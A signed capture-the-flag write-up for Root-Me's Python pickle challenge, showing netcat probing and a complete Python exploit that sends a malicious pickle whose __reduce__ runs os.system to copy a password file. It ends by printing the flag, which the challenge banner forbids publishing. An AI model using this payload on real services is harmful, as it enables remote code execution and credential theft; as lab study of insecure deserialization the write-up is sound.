@@ -1,0 +1,157 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: 2017_python-pickle.txt,v 1.0 2017/04/11 08:49:32 dhn Exp $
+
+Writeup Python - pickle [1]
+
+0x0) test via curl
+
+[dhn]::[~/dev/write_ups] (master) curl -i challenge02.root-me.org:60005
+HTTP/1.0 404 Not Found
+Server: BaseHTTP/0.3 Python/2.7.3
+Date: Tue, 11 Apr 2017 07:06:43 GMT
+Content-type: text/plain
+
+{"result": "Not allowed you should first AUTH"}
+[dhn]::[~/dev/write_ups] (master)
+
+0x1) send AUTH
+
+[dhn]::[~/dev/write_ups] (master) printf "AUTH admin HTTP/1.1\n\n" | nc challenge02.root-me.org 60005
+HTTP/1.0 404 Not Found
+Server: BaseHTTP/0.3 Python/2.7.3
+Date: Tue, 11 Apr 2017 07:10:29 GMT
+Content-type: text/plain
+
+{"result": "Can't find 'Authenticate' header"}
+[dhn]::[~/dev/write_ups] (master)
+
+0x2) send 'Authenticate' header
+
+[dhn]::[~/dev/write_ups] (master) printf "AUTH admin HTTP/1.1\nAuthenticate: admin\n\n" | nc challenge02.root-me.org 60005
+HTTP/1.0 404 Not Found
+Server: BaseHTTP/0.3 Python/2.7.3
+Date: Tue, 11 Apr 2017 07:11:59 GMT
+Content-type: text/plain
+
+{"result": "Authentication failed = Traceback (most recent call last):\n  File \"/challenge/app-script/ch5/ch5\", line 52, in do_AUTH\n    authcombi = pickle.loads(base64.b64decode(self.headers.getheader('Authenticate')))\n  File \"/usr/lib/python2.7/base64.py\", line 76, in b64decode\n    raise TypeError(msg)\nTypeError: Incorrect padding\n"}
+[dhn]::[~/dev/write_ups] (master)
+
+0x3) exploit in combination with a base64 decoding authentication string [2]
+
+[dhn]::[~/dev/write_ups] (master) cat pickle_root-me.py
+#!/usr/bin/env python
+# $Id: pickle_root-me.py,v 1.0 2017/04/11 08:50:55 dhn Exp $
+
+import os
+import sys
+import socket
+import base64
+import cPickle
+
+
+class Payload(object):
+    def __reduce__(self):
+        return (os.system, (
+                'cp /challenge/app-script/ch5/.passwd \
+                    /tmp/ch5_passwd; \
+                    chmod 777 /tmp/ch5_passwd',)
+            )
+
+class Exploit():
+    def __init__(self, host ,port):
+        self.__payload = cPickle.dumps(Payload())
+        self.__passwd = str(base64.b64encode(self.__payload))
+        self.__host = host
+        self.__port = port
+
+    def run(self):
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((self.__host, self.__port))
+
+        s.send("AUTH admin HTTP/1.1\n")
+        s.send("Authenticate: %s\n\n" %(self.__passwd))
+        r = s.recv(4096)
+        print(r)
+
+if __name__ == "__main__":
+    host = "challenge02.root-me.org"
+    port = 60005
+
+    exploit = Exploit(host, port)
+    exploit.run()
+
+[dhn]::[~/dev/write_ups] (master) ./pickle_root-me.py
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.3 Python/2.7.3
+Date: Tue, 11 Apr 2017 07:16:07 GMT
+Content-type: text/plain
+
+{"result": "Authentication successful"}
+
+0x4) get the flag
+
+[dhn]::[~/dev/write_ups] (master) ssh -p 2222 app-script-ch11@challenge02.root-me.org
+                 _    
+ _ __ ___   ___ | |_       _ __ ___   ___    ___  _ __ __ _ 
+| '__/ _ \ / _ \| __| ___ | '_ ` _ \ / _ \  / _ \| '__/ _` |
+| | | (_) | (_) | |__|___|| | | | | |  __/_| (_) | | | (_| |
+|_|  \___/ \___/ \__|     |_| |_| |_|\___(_)\___/|_|  \__, |
+                                                      |___/ 
+
+app-script-ch11@challenge02.root-me.org's password: 
+
+ ------------------------------------------------ 
+|    Welcome on challenge02.root-me.org!         |
+ ------------------------------------------------ 
+
+/tmp and /var/tmp are writeable
+
+Useful commands available:
+    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, ROPgadget, radare2
+
+Attention:
+  Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
+  Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.
+
+ ------------------------------------------------ 
+|    Challenge informations:                     |
+ ------------------------------------------------ 
+
+./ch11: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0c126a7464ba9f350dc72b962b31373491c710eb, not stripped
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./ch11
+
+ASLR is OFF
+
+
+app-script-ch11@challenge02:~$ cat /tmp/ch5_passwd
+6kSGEI2bh8bgRfCW
+app-script-ch11@challenge02:~$
+
+0x5) flag:
+
+	6kSGEI2bh8bgRfCW
+
+[1] https://www.root-me.org/de/Challenges/App-Script/Python-pickle
+[2] https://blog.nelhage.com/2011/03/exploiting-pickle/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJY7IVWAAoJEKjdmUcmQRI87JwP/2R6LDVYlbvBbThF45FrGx7J
++rpYYBzMEJwpPkg96+fm8ZfTML+spW520hrd4L/fxuifio+nLTK3Ue2pHUKm6Zak
+1c5VeO+HCNA7HNJYYulEoXQRlEp98NBph3ha/PaInVDikx4iF/owwVtMaeasW6RW
+UICZ2HK9QASsk4sja1ZLvdXAlpHsr0xm+H77h59yqcLzEqAYaz+kd3QoEJ68BnU0
+0mjnNNGPKi2d/iyKSqle7OgxsQ7NSw5fGwiEe0DD7dmmaldQyVYKqkVTw6WdVkbS
+jxCWp//PjjK/MR9YqNBId3NXoOl4nxz4Kp7owR50f151nE2hDuigd8lL6Vy9rvc4
+XJs2JhXje7wYcXnnbp1nXiVAmBnOokCq/3fL4TxqWZ5T000Ut1xNmT3ssAtAke9j
+0GCJrJTak2tFibzayrS2H9uOmGdNsUWCg4d/KBZ5LLHEReAb3rJfNJVfy9sWhklF
+oBAAHVl1dCMsHcWPHjPafqN4e8s96+JXJxr8szPR9i5PWBXqS2Y6QwM24Pe2RPJh
+3R6uOcsDPg3eyZv9bLeu2rDM98OBtikGu3ipifDvJnNTNaHeS8VRIiWky1BNrbHQ
+FCY+2xHKZwpArvAjmvuyZFSiEJRlEXnwb8tmtex6eW4CCt/nWCXPvJJhcUJ0WDS8
+iO5xqBCpi2+srRUxWY8Q
+=uqtT
+-----END PGP SIGNATURE-----
